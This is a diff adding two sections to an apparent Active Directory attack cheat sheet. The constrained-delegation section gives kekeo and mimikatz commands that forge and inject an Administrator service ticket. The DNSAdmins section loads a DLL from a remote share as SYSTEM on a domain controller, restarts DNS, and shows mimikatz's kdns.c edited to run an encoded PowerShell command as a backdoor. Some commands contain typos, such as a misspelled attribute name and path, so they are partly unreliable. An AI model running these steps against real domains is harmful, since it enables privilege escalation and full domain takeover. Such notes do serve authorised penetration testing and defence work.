@@ -206,7 +206,100 @@ A typical scenario where constrained delegation is userd is where a user authent
 
 To impersonate the user, Service for user as known as `S4U` extension is used which provides two extensions:
 
-* **Service for User to Self (S4U2self)**: Allows a service to obtain a forwardable TGS to itself on behalf a user.
+* **Service for User to Self (S4U2self)**: Allows a service to obtain a forwardable TGS to itself on behalf a user with just the user principal name without supplying a password. The service account must have the `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` (T2A4D UserAccountControl attribute).
 
-* **Service for User to Proxy (S4U2proxy)**: Allows a service to obtain a TGS to a second service on behalf of a user.
+* **Service for User to Proxy (S4U2proxy)**: Allows a service to obtain a TGS to a second service on behalf of a user. The attribute `msDS-AllowedToDelegate` attribute contains a list of SPNs to which the user tokens can be forwarded.
 
+
+To abuse constrained delegation, we need to have access to the web service account. If we have access to that account, it is possible to access the services listed in `msDS-AllowedToDelegateTo` of the web service accoutn as any user.
+
+* PowerView Dev:
+```powershell
+Get-DomainUser -TrustedToAuth
+Get-DomainComputer -TrustedToAuth
+```
+* ADModule:
+```
+Get-ADObject -Filter {msDS-AllowerToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
+```
+
+We can use `asktgt` from `kekeo` to request a TGT.
+
+```
+.\kekeo.exe
+
+tgt::ask /user:websvc /domain
+```
+Once we have the TGT, with kekeo we can request a TGS.
+
+```
+tgt::s4u /tgt:TGT_websvc@CORP.LOCAL_krbtgt~corp.local@corp.local.kirbi /user:Administrator@corp.local /service:cifs/mssql.corp.local
+```
+Finally with mimikatz we can inject the ticket on the current session:
+
+```
+Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@corp.local@CORP.LOCAL_cifs~mssql.corp.local@CORP.LOCAL.kirbi"'
+```
+
+> **Note**: The delegation occurs not only for the specified service but for any service running under the same account. The is no validation for the SPN specified.
+
+
+# DNSAdmins
+
+It is possible for the members of the **DNSAdmins** group to load arbitrary DLL with the privileges of dns.exe which is `NT AUTHORITY\SYSTEM`.
+
+In case the domain controllers also serves as DNS, this will provide us escalation to domain admin. We just need privileges to restart the DNS service.
+
+Enumerate the `DNSAdmins` group:
+
+* PowerView:
+```powershell
+Get-NetGroupMember -GroupName "DNSAdmins"
+```
+
+* ADModule:
+```powershell
+Get-ADGRoupMember -Identity DNSAdmins
+```
+
+After compromise a member and from the privileges of DNSAdmins group, we can configure a `dll`:
+
+
+* dnscmd.exe:
+```
+dnscmd dc01 /config /serverlevelplugindll \\10.10.10.10\share\mimilib.dll
+```
+
+* DNSServer:
+```
+$dnsettings = Get-DnsServerSetting -ComputerName dc01 -Verbose -All
+$dnsettings.ServerLevelPluginDll = "\\10.10.10.10\share\mimilib.dll"
+Set-DnsServerSetting -InputObject $dnsettings -ComputerName dc01 -Verbose
+```
+
+We need to restart the service:
+
+```
+sc \\dc01.corp.local stop dns
+sc \\dc01.corp.local start dns
+```
+
+By default `mimilib.dll` logs all DNS queries on the following file:
+```
+c:\windows\sytem32\kiwidns.log
+```
+
+We can modify the source code of `kdns.c` from `mimikatz` in order to add a reverse shell or other type of backdoor.
+
+```
+#pragma warning(disable:4996)
+	if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
+#pragma warning(pop)
+	{
+		klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
+		fclose(kdns_logfile);
+		system("C:\\Windows\\System32\WindowsPowerShell\\v1.0\\powershell.exe -e ZQBjAGgAbwAgACIAdABlAHMAdAAiAA==")   //THIS LINE
+	}
+	return ERROR_SUCCESS;
+}
+```
